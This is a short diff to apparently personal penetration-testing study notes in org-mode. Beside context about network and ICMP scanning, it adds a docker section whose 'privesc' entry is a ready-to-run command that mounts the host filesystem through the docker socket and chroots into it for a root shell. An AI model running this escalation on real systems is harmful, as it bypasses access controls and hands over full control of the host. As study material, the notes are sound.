@@ -107,3 +107,10 @@ Most of these (with the exception of UDP scans) are used for very similar purpos
 
 In terms of network scanning, we will also look briefly at ICMP (or "ping") scanning.
 #+end_src
+
+* docker
+- docker images
+  : lists the docker images in system
+
+- privesc
+  : docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash
